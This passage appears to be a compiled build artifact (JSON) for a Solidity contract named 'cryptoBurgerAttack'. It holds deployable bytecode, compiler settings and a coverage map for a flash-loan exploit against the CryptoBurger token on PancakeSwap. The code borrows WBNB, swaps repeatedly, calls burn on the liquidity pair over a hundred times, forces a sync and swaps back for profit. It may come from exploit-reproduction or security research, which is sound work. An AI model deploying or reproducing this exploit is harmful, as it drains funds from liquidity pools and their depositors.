60040161294b9493929190612ece565b600060405180830381600087803b15801561296557600080fd5b505af1158015612979573d6000803e3d6000fd5b5050505050505050505050565b60405163095ea7b360e01b81527302b0551b656509754285eec81ee894338e14c5dd6004820152602481018490526001600160a01b0386169063095ea7b3906044016020604051808303816000875af11580156129e7573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190612a0b9190612eac565b5060405163095ea7b360e01b8152600080516020612fbe8339815191526004820152602481018490526001600160a01b0386169063095ea7b3906044016020604051808303816000875af1158015612a67573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190612a8b9190612eac565b5060408051600280825260608083018452926020830190803683370190505090508581600081518110612ac057612ac0612c93565b60200260200101906001600160a01b031690816001600160a01b0316815250508481600181518110612af457612af4612c93565b6001600160a01b0390921660209283029190910190910152604051635c11d79560e01b8152600080516020612fbe83398151915290635c11d79590612b459087908790869088904290600401612f41565b600060405180830381600087803b158015612b5f57600080fd5b505af1158015612b73573d6000803e3d6000fd5b50505050505050505050565b6001600160a01b0381168114612b9457600080fd5b50565b600080600080600060808688031215612baf57600080fd5b8535612bba81612b7f565b94506020860135935060408601359250606086013567ffffffffffffffff80821115612be557600080fd5b818801915088601f830112612bf957600080fd5b813581811115612c0857600080fd5b896020828501011115612c1a57600080fd5b9699959850939650602001949392505050565b60008060408385031215612c4057600080fd5b8235612c4b81612b7f565b946020939093013593505050565b600060208284031215612c6b57600080fd5b8151612c7681612b7f565b9392505050565b634e487b7160e01b600052604160045260246000fd5b634e487b7160e01b600052603260045260246000fd5b600081518084526020808501945080840160005b83811015612ce25781516001600160a01b031687529582019590820190600101612cbd565b509495945050505050565b828152604060208201526000612d066040830184612ca9565b949350505050565b60006020808385031215612d2157600080fd5b825167ffffffffffffffff80821115612d3957600080fd5b818501915085601f830112612d4d57600080fd5b815181811115612d5f57612d5f612c7d565b8060051b604051601f19603f83011681018181108582111715612d8457612d84612c7d565b604052918252848201925083810185019188831115612da257600080fd5b938501935b82851015612dc057845184529385019392850192612da7565b98975050505050505050565b600060208284031215612dde57600080fd5b5051919050565b60408082526018908201527f57424e422062616c616e6365206f6620636f6e747261637400000000000000006060820152602081019190915260800190565b634e487b7160e01b600052601160045260246000fd5b600060018201612e4c57612e4c612e24565b5060010190565b6000816000190483118215151615612e6d57612e6d612e24565b500290565b600082612e8f57634e487b7160e01b600052601260045260246000fd5b500490565b60008219821115612ea757612ea7612e24565b500190565b600060208284031215612ebe57600080fd5b81518015158114612c7657600080fd5b84815260006020858184015260018060a01b038516604084015260806060840152835180608085015260005b81811015612f165785810183015185820160a001528201612efa565b81811115612f2857600060a083870101525b50601f01601f19169290920160a0019695505050505050565b85815284602082015260a060408201526000612f6060a0830186612ca9565b6001600160a01b039490941660608301525060800152939250505056fe000000000000000000000000f40d33de6737367a1ccb0ce6a056698d993a17e1000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c00000000000000000000000010ed43c718714eb63d5aa57b78b54704e256024e5468652072657175697265642057424e4220616d6f756e7420666f722031394d500a5c23c900bdde1352bb093d0b6480339dc3317c387f4a23ff9aecc606ff45a2646970667358221220e13b67340fb96dcbb1ab3fc96bdae0eff6ad2686696e44c927205c673a92985764736f6c634300080d0033",
  "bytecodeSha1": "fd46b53d83301434270f0e96defc45942d253031",
  "compiler": {
    "evm_version": "istanbul",
    "optimizer": {
      "enabled": true,
      "runs": 200
    },
    "version": "0.8.13+commit.abaa5c0e"
  },
  "contractName": "cryptoBurgerAttack",
  "coverageMap": {
    "branches": {
      "0": {
        "cryptoBurgerAttack.flashLoan": {
          "106": [
            1462,
            1480,
            true
          ],
          "107": [
            1645,
            1667,
            true
          ],
          "108": [
            1712,
            1734,
            true
          ]
        },
        "cryptoBurgerAttack.pancakeCall": {
          "104": [
            2339,
            2357,
            true
          ],
          "105": [
            2400,
            2424,
            true
          ]
        }
      },
      "1": {},
      "2": {}
    },
    "statements": {
      "0": {
        "cryptoBurgerAttack.flashLoan": {
          "96": [
            1454,
            1505
          ],
          "97": [
            1759,
            1914
          ]
        },
        "cryptoBurgerAttack.pancakeCall": {
          "0": [
            2331,
            2382
          ],
          "1": [
            2392,
            2436
          ],
          "2": [
            2605,
            2659
          ],
          "3": [
            2779,
            2802
          ],
          "4": [
            2813,
            2827
          ],
          "5": [
            2837,
            2853
          ],
          "6": [
            2903,
            3025
          ],
          "7": [
            3036,
            3174
          ],
          "8": [
            3185,
            3291
          ],
          "9": [
            3301,
            3412
          ],
          "10": [
            3422,
            3486
          ],
          "11": [
            3496,
            3618
          ],
          "12": [
            3629,
            3752
          ],
          "13": [
            3763,
            3874
          ],
          "14": [
            3884,
            3948
          ],
          "15": [
            3958,
            4080
          ],
          "16": [
            4090,
            4213
          ],
          "17": [
            4223,
            4334
          ],
          "18": [
            4345,
            4409
          ],
          "19": [
            4419,
            4541
          ],
          "20": [
            4551,
            4674
          ],
          "21": [
            4684,
            4795
          ],
          "22": [
            4805,
            4869
          ],
          "23": [
            4879,
            5001
          ],
          "24": [
            5011,
            5134
          ],
          "25": [
            5144,
            5255
          ],
          "26": [
            5266,
            5330
          ],
          "27": [
            5340,
            5462
          ],
          "28": [
            5472,
            5595
          ],
          "29": [
            5605,
            5716
          ],
          "30": [
            5726,
            5790
          ],
          "31": [
            5800,
            5922
          ],
          "32": [
            5932,
            6055
          ],
          "33": [
            6066,
            6177
          ],
          "34": [
            6187,
            6251
          ],
          "35": [
            6261,
            6383
          ],
          "36": [
            6393,
            6516
          ],
          "37": [
            6526,
            6637
          ],
          "38": [
            6647,
            6711
          ],
          "39": [
            6721,
            6843
          ],
          "40": [
            6853,
            6964
          ],
          "41": [
            6974,
            7097
          ],
          "42": [
            7107,
            7171
          ],
          "43": [
            7181,
            7303
          ],
          "44": [
            7313,
            7377
          ],
          "45": [
            7387,
            7509
          ],
          "46": [
            7519,
            7583
          ],
          "47": [
            7593,
            7715
          ],
          "48": [
            7725,
            7789
          ],
          "49": [
            7799,
            7921
          ],
          "50": [
            7931,
            7995
          ],
          "51": [
            8005,
            8127
          ],
          "52": [
            8137,
            8201
          ],
          "53": [
            8212,
            8334
          ],
          "54": [
            8344,
            8408
          ],
          "55": [
            8418,
            8540
          ],
          "56": [
            8550,
            8614
          ],
          "57": [
            8624,
            8746
          ],
          "58": [
            8756,
            8820
          ],
          "59": [
            8831,
            8953
          ],
          "60": [
            8963,
            9027
          ],
          "61": [
            9037,
            9159
          ],
          "62": [
            9169,
            9233
          ],
          "63": [
            9243,
            9365
          ],
          "64": [
            9375,
            9439
          ],
          "65": [
            9485,
            9611
          ],
          "66": [
            9622,
            9683
          ],
          "67": [
            9764,
            9818
          ],
          "68": [
            9745,
            9748
          ],
          "69": [
            9838,
            9959
          ],
          "70": [
            9969,
            10007
          ],
          "71": [
            10018,
            10079
          ],
          "72": [
            10089,
            10150
          ],
          "73": [
            10160,
            10221
          ],
          "74": [
            10231,
            10292
          ],
          "75": [
            10302,
            10363
          ],
          "76": [
            10373,
            10434
          ],
          "77": [
            10444,
            10505
          ],
          "78": [
            10515,
            10576
          ],
          "79": [
            10586,
            10647
          ],
          "80": [
            10657,
            10718
          ],
          "81": [
            10728,
            10789
          ],
          "82": [
            10799,
            10860
          ],
          "83": [
            10870,
            10931
          ],
          "84": [
            10941,
            11002
          ],
          "85": [
            11012,
            11073
          ],
          "86": [
            11083,
            11144
          ],
          "87": [
            11154,
            11215
          ],
          "88": [
            11225,
            11286
          ],
          "89": [
            11296,
            11357
          ],
          "90": [
            11368,
            11528
          ],
          "91": [
            11539,
            11663
          ],
          "92": [
            11801,
            11850
          ],
          "93": [
            11860,
            11899
          ],
          "94": [
            11910,
            12017
          ],
          "95": [
            12027,
            12089
          ]
        },
        "cryptoBurgerAttack.swapIt": {
          "98": [
            12313,
            12366
          ],
          "99": [
            12376,
            12431
          ],
          "100": [
            12473,
            12496
          ],
          "101": [
            12507,
            12525
          ],
          "102": [
            12535,
            12554
          ],
          "103": [
            12565,
            12812
          ]
        }
      },
      "1": {},
      "2": {}
    }
  },
  "dependencies": [
    "IERC20",
    "IPancakeCallee",
    "IPancakeFactory",
    "IPancakePair",
    "IPancakeRouter01"
  ],
  "deployedBytecode": "60806040526004361061002d5760003560e01c806384800812146100395780639d9e465c1461005b57600080fd5b3661003457005b600080fd5b34801561004557600080fd5b50610059610054366004612b97565b61007b565b005b34801561006757600080fd5b50610059610076366004612c2d565b6126e4565b6000336001600160a01b0316630dfe16816040518163ffffffff1660e01b8152600401602060405180830381865afa1580156100bb573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906100df9190612c59565b90506000336001600160a01b031663d21220a76040518163ffffffff1660e01b8152600401602060405180830381865afa158015610121573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906101459190612c59565b60405163e6a4390560e01b81526001600160a01b0380851660048301528216602482015290915060009073ca143ce32fe78f1f7019d7d551a6402fc5350c739063e6a4390590604401602060405180830381865afa1580156101ab573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906101cf9190612c59565b9050336001600160a01b038216146102255760405162461bcd60e51b81526020600482015260146024820152734e6f742061207061697220636f6e74726163742160601b60448201526064015b60405180910390fd5b6001600160a01b03881630146102675760405162461bcd60e51b815260206004820152600760248201526610b9b2b73232b960c91b604482015260640161021c565b60008061027686880188612c2d565b6040805181815260138183015272436f6e74726163742062616c616e636520697360681b60608201524760208201529051929450909250600080516020612ffe833981519152919081900360800190a16040805160028082526060808301845269043c25e0dcc1bd1c00009390929190602083019080368337019050509050600080516020612f9e8339815191528160008151811061031757610317612c93565b60200260200101906001600160a01b031690816001600160a01b031681525050600080516020612f7e8339815191528160018151811061035957610359612c93565b6001600160a01b03909216602092830291909101909101526040516307c0329d60e21b8152606090600080516020612fbe83398151915290631f00ca74906103a79086908690600401612ced565b600060405180830381865afa1580156103c4573d6000803e3d6000fd5b505050506040513d6000823e601f3d908101601f191682016040526103ec9190810190612d0e565b6000546040516370a0823160e01b8152306004820152919250600080516020612ffe833981519152916001600160a01b03909116906370a0823190602401602060405180830381865afa158015610447573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061046b9190612dcc565b6040516104ce919060408082526033908201527f57424e422062616c616e6365206f6620636f6e7472616374206166746572207260608201527232b1b2b4bb3b34b73390333630b9b43637b0b760691b6080820152602081019190915260a00190565b60405180910390a1600080516020612ffe833981519152816000815181106104f8576104f8612c93565b602002602001015160405161054991906040808252602b90820152600080516020612fde83398151915260608201526a10212aa923903a37b5b2b760a91b6080820152602081019190915260a00190565b60405180910390a16000546040516370a0823160e01b8152306004820152600080516020612ffe833981519152916001600160a01b0316906370a0823190602401602060405180830381865afa1580156105a7573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906105cb9190612dcc565b6040516105d89190612de5565b60405180910390a1610624600080516020612f9e833981519152600080516020612f7e8339815191528360008151811061061457610614612c93565b6020026020010151600030612986565b6040516307c0329d60e21b8152600080516020612fbe83398151915290631f00ca74906106579086908690600401612ced565b600060405180830381865afa158015610674573d6000803e3d6000fd5b505050506040513d6000823e601f3d908101601f1916820160405261069c9190810190612d0e565b9050600080516020612ffe833981519152816000815181106106c0576106c0612c93565b602002602001015160405161072391906040808252603c90820152600080516020612fde83398151915260608201527f204255524720746f6b656e2061667465722031737420737761703a20000000006080820152602081019190915260a00190565b60405180910390a16000546040516370a0823160e01b8152306004820152600080516020612ffe833981519152916001600160a01b0316906370a0823190602401602060405180830381865afa158015610781573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906107a59190612dcc565b6040516107b29190612de5565b60405180910390a16107ee600080516020612f9e833981519152600080516020612f7e8339815191528360008151811061061457610614612c93565b6040516307c0329d60e21b8152600080516020612fbe83398151915290631f00ca74906108219086908690600401612ced565b600060405180830381865afa15801561083e573d6000803e3d6000fd5b505050506040513d6000823e601f3d908101601f191682016040526108669190810190612d0e565b9050600080516020612ffe8339815191528160008151811061088a5761088a612c93565b60200260200101516040516108ed91906040808252603c90820152600080516020612fde83398151915260608201527f204255524720746f6b656e20616674657220326e6420737761703a20000000006080820152602081019190915260a00190565b60405180910390a16000546040516370a0823160e01b8152306004820152600080516020612ffe833981519152916001600160a01b0316906370a0823190602401602060405180830381865afa15801561094b573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061096f9190612dcc565b60405161097c9190612de5565b60405180910390a16109b8600080516020612f9e833981519152600080516020612f7e8339815191528360008151811061061457610614612c93565b6040516307c0329d60e21b8152600080516020612fbe83398151915290631f00ca74906109eb9086908690600401612ced565b600060405180830381865afa158015610a08573d6000803e3d6000fd5b505050506040513d6000823e601f3d908101601f19168201604052610a309190810190612d0e565b9050600080516020612ffe83398151915281600081518110610a5457610a54612c93565b6020026020010151604051610ab791906040808252603c90820152600080516020612fde83398151915260608201527f204255524720746f6b656e2061667465722033726420737761703a20000000006080820152602081019190915260a00190565b60405180910390a16000546040516370a0823160e01b8152306004820152600080516020612ffe833981519152916001600160a01b0316906370a0823190602401602060405180830381865afa158015610b15573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610b399190612dcc565b604051610b469190612de5565b60405180910390a1610b82600080516020612f9e833981519152600080516020612f7e8339815191528360008151811061061457610614612c93565b6040516307c0329d60e21b8152600080516020612fbe83398151915290631f00ca7490610bb59086908690600401612ced565b600060405180830381865afa158015610bd2573d6000803e3d6000fd5b505050506040513d6000823e601f3d908101601f19168201604052610bfa9190810190612d0e565b9050600080516020612ffe83398151915281600081518110610c1e57610c1e612c93565b6020026020010151604051610c8191906040808252603c90820152600080516020612fde83398151915260608201527f204255524720746f6b656e2061667465722034746820737761703a20000000006080820152602081019190915260a00190565b60405180910390a16000546040516370a0823160e01b8152306004820152600080516020612ffe833981519152916001600160a01b0316906370a0823190602401602060405180830381865afa158015610cdf573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610d039190612dcc565b604051610d109190612de5565b60405180910390a1610d4c600080516020612f9e833981519152600080516020612f7e8339815191528360008151811061061457610614612c93565b6040516307c0329d60e21b8152600080516020612fbe83398151915290631f00ca7490610d7f9086908690600401612ced565b600060405180830381865afa158015610d9c573d6000803e3d6000fd5b505050506040513d6000823e601f3d908101601f19168201604052610dc49190810190612d0e565b9050600080516020612ffe83398151915281600081518110610de857610de8612c93565b6020026020010151604051610e4b91906040808252603c90820152600080516020612fde83398151915260608201527f204255524720746f6b656e2061667465722035746820737761703a20000000006080820152602081019190915260a00190565b60405180910390a16000546040516370a0823160e01b8152306004820152600080516020612ffe833981519152916001600160a01b0316906370a0823190602401602060405180830381865afa158015610ea9573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610ecd9190612dcc565b604051610eda9190612de5565b60405180910390a1610f16600080516020612f9e833981519152600080516020612f7e8339815191528360008151811061061457610614612c93565b6040516307c0329d60e21b8152600080516020612fbe83398151915290631f00ca7490610f499086908690600401612ced565b600060405180830381865afa158015610f66573d6000803e3d6000fd5b505050506040513d6000823e601f3d908101601f19168201604052610f8e9190810190612d0e565b9050600080516020612ffe83398151915281600081518110610fb257610fb2612c93565b602002602001015160405161101591906040808252603c90820152600080516020612fde83398151915260608201527f204255524720746f6b656e2061667465722036746820737761703a20000000006080820152602081019190915260a00190565b60405180910390a16000546040516370a0823160e01b8152306004820152600080516020612ffe833981519152916001600160a01b0316906370a0823190602401602060405180830381865afa158015611073573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906110979190612dcc565b6040516110a49190612de5565b60405180910390a16110e0600080516020612f9e833981519152600080516020612f7e8339815191528360008151811061061457610614612c93565b6040516307c0329d60e21b8152600080516020612fbe83398151915290631f00ca74906111139086908690600401612ced565b600060405180830381865afa158015611130573d6000803e3d6000fd5b505050506040513d6000823e601f3d908101601f191682016040526111589190810190612d0e565b9050600080516020612ffe8339815191528160008151811061117c5761117c612c93565b60200260200101516040516111df91906040808252603c90820152600080516020612fde83398151915260608201527f204255524720746f6b656e2061667465722037746820737761703a20000000006080820152602081019190915260a00190565b60405180910390a16000546040516370a0823160e01b8152306004820152600080516020612ffe833981519152916001600160a01b0316906370a0823190602401602060405180830381865afa15801561123d573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906112619190612dcc565b60405161126e9190612de5565b60405180910390a16112aa600080516020612f9e833981519152600080516020612f7e8339815191528360008151811061061457610614612c93565b6040516307c0329d60e21b8152600080516020612fbe83398151915290631f00ca74906112dd9086908690600401612ced565b600060405180830381865afa1580156112fa573d6000803e3d6000fd5b505050506040513d6000823e601f3d908101601f191682016040526113229190810190612d0e565b6000546040516370a0823160e01b8152306004820152919250600080516020612ffe833981519152916001600160a01b03909116906370a0823190602401602060405180830381865afa15801561137d573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906113a19190612dcc565b6040516113ae9190612de5565b60405180910390a1600080516020612ffe833981519152816000815181106113d8576113d8612c93565b602002602001015160405161143b91906040808252603c90820152600080516020612fde83398151915260608201527f204255524720746f6b656e2061667465722038746820737761703a20000000006080820152602081019190915260a00190565b60405180910390a1611477600080516020612f9e833981519152600080516020612f7e8339815191528360008151811061061457610614612c93565b6040516307c0329d60e21b8152600080516020612fbe83398151915290631f00ca74906114aa9086908690600401612ced565b600060405180830381865afa1580156114c7573d6000803e3d6000fd5b505050506040513d6000823e601f3d908101601f191682016040526114ef9190810190612d0e565b9050611525600080516020612f9e833981519152600080516020612f7e8339815191528360008151811061061457610614612c93565b6040516307c0329d60e21b8152600080516020612fbe83398151915290631f00ca74906115589086908690600401612ced565b600060405180830381865afa158015611575573d6000803e3d6000fd5b505050506040513d6000823e601f3d908101601f1916820160405261159d9190810190612d0e565b90506115d3600080516020612f9e833981519152600080516020612f7e8339815191528360008151811061061457610614612c93565b6040516307c0329d60e21b8152600080516020612fbe83398151915290631f00ca74906116069086908690600401612ced565b600060405180830381865afa158015611623573d6000803e3d6000fd5b505050506040513d6000823e601f3d908101601f1916820160405261164b9190810190612d0e565b9050611681600080516020612f9e833981519152600080516020612f7e8339815191528360008151811061061457610614612c93565b6040516307c0329d60e21b8152600080516020612fbe83398151915290631f00ca74906116b49086908690600401612ced565b600060405180830381865afa1580156116d1573d6000803e3d6000fd5b505050506040513d6000823e601f3d908101601f191682016040526116f99190810190612d0e565b905061172f600080516020612f9e833981519152600080516020612f7e8339815191528360008151811061061457610614612c93565b6040516307c0329d60e21b8152600080516020612fbe83398151915290631f00ca74906117629086908690600401612ced565b600060405180830381865afa15801561177f573d6000803e3d6000fd5b505050506040513d6000823e601f3d908101601f191682016040526117a79190810190612d0e565b90506117dd600080516020612f9e833981519152600080516020612f7e8339815191528360008151811061061457610614612c93565b6040516307c0329d60e21b8152600080516020612fbe83398151915290631f00ca74906118109086908690600401612ced565b600060405180830381865afa15801561182d573d6000803e3d6000fd5b505050506040513d6000823e601f3d908101601f191682016040526118559190810190612d0e565b905061188b600080516020612f9e833981519152600080516020612f7e8339815191528360008151811061061457610614612c93565b6040516307c0329d60e21b8152600080516020612fbe83398151915290631f00ca74906118be9086908690600401612ced565b600060405180830381865afa1580156118db573d6000803e3d6000fd5b505050506040513d6000823e601f3d908101601f191682016040526119039190810190612d0e565b9050611939600080516020612f9e833981519152600080516020612f7e8339815191528360008151811061061457610614612c93565b6040516307c0329d60e21b8152600080516020612fbe83398151915290631f00ca749061196c9086908690600401612ced565b600060405180830381865afa158015611989573d6000803e3d6000fd5b505050506040513d6000823e601f3d908101601f191682016040526119b19190810190612d0e565b90506119e7600080516020612f9e833981519152600080516020612f7e8339815191528360008151811061061457610614612c93565b6040516307c0329d60e21b8152600080516020612fbe83398151915290631f00ca7490611a1a9086908690600401612ced565b600060405180830381865afa158015611a37573d6000803e3d6000fd5b505050506040513d6000823e601f3d908101601f19168201604052611a5f9190810190612d0e565b9050611a95600080516020612f9e833981519152600080516020612f7e8339815191528360008151811061061457610614612c93565b6040516307c0329d60e21b8152600080516020612fbe83398151915290631f00ca7490611ac89086908690600401612ced565b600060405180830381865afa158015611ae5573d6000803e3d6000fd5b505050506040513d6000823e601f3d908101601f19168201604052611b0d9190810190612d0e565b9050611b43600080516020612f9e833981519152600080516020612f7e8339815191528360008151811061061457610614612c93565b6040516307c0329d60e21b8152600080516020612fbe83398151915290631f00ca7490611b769086908690600401612ced565b600060405180830381865afa158015611b93573d6000803e3d6000fd5b505050506040513d6000823e601f3d908101601f19168201604052611bbb9190810190612d0e565b9050611bf1600080516020612f9e833981519152600080516020612f7e8339815191528360008151811061061457610614612c93565b6000546040516370a0823160e01b8152306004820152600080516020612ffe833981519152916001600160a01b0316906370a0823190602401602060405180830381865afa158015611c47573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190611c6b9190612dcc565b604051611cc2919060408082526027908201527f57424e422042616c616e6365206f6620636f6e747261637420616674657220736060820152663bb0b83997171760c91b6080820152602081019190915260a00190565b60405180910390a1600080516020612ffe83398151915281600081518110611cec57611cec612c93565b602090810291909101810151604080518181529081018390527f486f77206d7563682049206e65656420666f7220616e6f74686572207377617060608201529182015260800160405180910390a160005b608d811015611dda57600154604051632770a7eb60e21b81527302b0551b656509754285eec81ee894338e14c5dd600482015269043c25e0dcc1bd1c000060248201526001600160a01b0390911690639dc29fac90604401600060405180830381600087803b158015611daf57600080fd5b505af1158015611dc3573d6000803e3d6000fd5b505050508080611dd290612e3a565b915050611d3d565b506001546040516370a0823160e01b81527302b0551b656509754285eec81ee894338e14c5dd6004820152600080516020612ffe833981519152916001600160a01b0316906370a0823190602401602060405180830381865afa158015611e45573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190611e699190612dcc565b604051611eb091906040808252601c908201527f425552472062616c616e6365206f66205061636b6167652070616972000000006060820152602081019190915260800190565b60405180910390a17302b0551b656509754285eec81ee894338e14c5dd6001600160a01b031663fff6cae96040518163ffffffff1660e01b8152600401600060405180830381600087803b158015611f0757600080fd5b505af1158015611f1b573d6000803e3d6000fd5b50505050611f53600080516020612f7e833981519152600080516020612f9e83398151915269043c33c1937564800000600030612986565b611f87600080516020612f7e833981519152600080516020612f9e83398151915269043c33c1937564800000600030612986565b611fbb600080516020612f7e833981519152600080516020612f9e83398151915269043c33c1937564800000600030612986565b611fef600080516020612f7e833981519152600080516020612f9e83398151915269043c33c1937564800000600030612986565b612023600080516020612f7e833981519152600080516020612f9e83398151915269043c33c1937564800000600030612986565b612057600080516020612f7e833981519152600080516020612f9e83398151915269043c33c1937564800000600030612986565b61208b600080516020612f7e833981519152600080516020612f9e83398151915269043c33c1937564800000600030612986565b6120bf600080516020612f7e833981519152600080516020612f9e83398151915269043c33c1937564800000600030612986565b6120f3600080516020612f7e833981519152600080516020612f9e83398151915269043c33c1937564800000600030612986565b612127600080516020612f7e833981519152600080516020612f9e83398151915269043c33c1937564800000600030612986565b61215b600080516020612f7e833981519152600080516020612f9e83398151915269043c33c1937564800000600030612986565b61218f600080516020612f7e833981519152600080516020612f9e83398151915269043c33c1937564800000600030612986565b6121c3600080516020612f7e833981519152600080516020612f9e83398151915269043c33c1937564800000600030612986565b6121f7600080516020612f7e833981519152600080516020612f9e83398151915269043c33c1937564800000600030612986565b61222b600080516020612f7e833981519152600080516020612f9e83398151915269043c33c1937564800000600030612986565b61225f600080516020612f7e833981519152600080516020612f9e83398151915269043c33c1937564800000600030612986565b612293600080516020612f7e833981519152600080516020612f9e83398151915269043c33c1937564800000600030612986565b6122c7600080516020612f7e833981519152600080516020612f9e83398151915269043c33c1937564800000600030612986565b6122fb600080516020612f7e833981519152600080516020612f9e83398151915269043c33c1937564800000600030612986565b6001546040516370a0823160e01b815230600482015261239191600080516020612f7e83398151915291600080516020612f9e833981519152916001600160a01b0316906370a0823190602401602060405180830381865afa158015612365573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906123899190612dcc565b600030612986565b6001546040516370a0823160e01b8152306004820152600080516020612ffe833981519152916001600160a01b0316906370a0823190602401602060405180830381865afa1580156123e7573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061240b9190612dcc565b60405161245e919060408082526023908201527f425552472062616c616e6365206f6620636f6e7472616374206166746572207360608201526207761760ec1b6080820152602081019190915260a00190565b60405180910390a160006103e5612476866003612e53565b6124809190612e72565b61248b906001612e94565b905060006124998287612e94565b60405163a9059cbb60e01b81526001600160a01b038a81166004830152602482018390529192509088169063a9059cbb906044016020604051808303816000875af11580156124ec573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906125109190612eac565b5060408051818152600c818301526b14995c185e48185b5bdd5b9d60a21b6060820152602081018390529051600080516020612ffe8339815191529181900360800190a16000546040516370a0823160e01b8152306004820152600080516020612ffe833981519152916001600160a01b0316906370a0823190602401602060405180830381865afa1580156125aa573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906125ce9190612dcc565b60405161260c91906040808252601490820152730283937b334ba1030b33a32b9103932b830bc9d160651b6060820152602081019190915260800190565b60405180910390a1600154604080516318160ddd60e01b81529051600080516020612ffe833981519152926001600160a01b0316916318160ddd9160048083019260209291908290030181865afa15801561266b573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061268f9190612dcc565b6040516126cb919060408082526012908201527102a37ba30b610212aa9239039bab838363c960751b6060820152602081019190915260800190565b60405180910390a1505050505050505050505050505050565b60405163e6a4390560e01b81526001600160a01b0383166004820152738ac76a51cc950d9822d68b83fe1ad97b32cd580d602482015260009073ca143ce32fe78f1f7019d7d551a6402fc5350c739063e6a4390590604401602060405180830381865afa158015612759573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061277d9190612c59565b90506001600160a01b0381166127cc5760405162461bcd60e51b81526020600482015260146024820152735061697220646f65736e2774206578697374732160601b604482015260640161021c565b6000816001600160a01b0316630dfe16816040518163ffffffff1660e01b8152600401602060405180830381865afa15801561280c573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906128309190612c59565b90506000826001600160a01b031663d21220a76040518163ffffffff1660e01b8152600401602060405180830381865afa158015612872573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906128969190612c59565b90506000826001600160a01b0316866001600160a01b0316146128ba5760006128bc565b845b90506000826001600160a01b0316876001600160a01b0316146128e05760006128e2565b855b9050846001600160a01b031663022c0d9f8383308b8b60405160200161291d9291906001600160a01b03929092168252602082015260400190565b6040516020818303038152906040526040518563ffffffff1660e01b815260040161294b9493929190612ece565b600060405180830381600087803b15801561296557600080fd5b505af1158015612979573d6000803e3d6000fd5b5050505050505050505050565b60405163095ea7b360e01b81527302b0551b656509754285eec81ee894338e14c5dd6004820152602481018490526001600160a01b0386169063095ea7b3906044016020604051808303816000875af11580156129e7573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190612a0b9190612eac565b5060405163095ea7b360e01b8152600080516020612fbe8339815191526004820152602481018490526001600160a01b0386169063095ea7b3906044016020604051808303816000875af1158015612a67573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190612a8b9190612eac565b5060408051600280825260608083018452926020830190803683370190505090508581600081518110612ac057612ac0612c93565b60200260200101906001600160a01b031690816001600160a01b0316815250508481600181518110612af457612af4612c93565b6001600160a01b0390921660209283029190910190910152604051635c11d79560e01b8152600080516020612fbe83398151915290635c11d79590612b459087908790869088904290600401612f41565b600060405180830381600087803b158015612b5f57600080fd5b505af1158015612b73573d6000803e3d6000fd5b50505050505050505050565b6001600160a01b0381168114612b9457600080fd5b50565b600080600080600060808688031215612baf57600080fd5b8535612bba81612b7f565b94506020860135935060408601359250606086013567ffffffffffffffff80821115612be557600080fd5b818801915088601f830112612bf957600080fd5b813581811115612c0857600080fd5b896020828501011115612c1a57600080fd5b9699959850939650602001949392505050565b60008060408385031215612c4057600080fd5b8235612c4b81612b7f565b946020939093013593505050565b600060208284031215612c6b57600080fd5b8151612c7681612b7f565b9392505050565b634e487b7160e01b600052604160045260246000fd5b634e487b7160e01b600052603260045260246000fd5b600081518084526020808501945080840160005b83811015612ce25781516001600160a01b031687529582019590820190600101612cbd565b509495945050505050565b828152604060208201526000612d066040830184612ca9565b949350505050565b60006020808385031215612d2157600080fd5b825167ffffffffffffffff80821115612d3957600080fd5b818501915085601f830112612d4d57600080fd5b815181811115612d5f57612d5f612c7d565b8060051b604051601f19603f83011681018181108582111715612d8457612d84612c7d565b604052918252848201925083810185019188831115612da257600080fd5b938501935b82851015612dc057845184529385019392850192612da7565b98975050505050505050565b600060208284031215612dde57600080fd5b5051919050565b60408082526018908201527f57424e422062616c616e6365206f6620636f6e747261637400000000000000006060820152602081019190915260800190565b634e487b7160e01b600052601160045260246000fd5b600060018201612e4c57612e4c612e24565b5060010190565b6000816000190483118215151615612e6d57612e6d612e24565b500290565b600082612e8f57634e487b7160e01b600052601260045260246000fd5b500490565b60008219821115612ea757612ea7612e24565b500190565b600060208284031215612ebe57600080fd5b81518015158114612c7657600080fd5b84815260006020858184015260018060a01b038516604084015260806060840152835180608085015260005b81811015612f165785810183015185820160a001528201612efa565b81811115612f2857600060a083870101525b50601f01601f19169290920160a0019695505050505050565b85815284602082015260a060408201526000612f6060a0830186612ca9565b6001600160a01b039490941660608301525060800152939250505056fe000000000000000000000000f40d33de6737367a1ccb0ce6a056698d993a17e1000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c00000000000000000000000010ed43c718714eb63d5aa57b78b54704e256024e5468652072657175697265642057424e4220616d6f756e7420666f722031394d500a5c23c900bdde1352bb093d0b6480339dc3317c387f4a23ff9aecc606ff45a2646970667358221220e13b67340fb96dcbb1ab3fc96bdae0eff6ad2686696e44c927205c673a92985764736f6c634300080d0033",
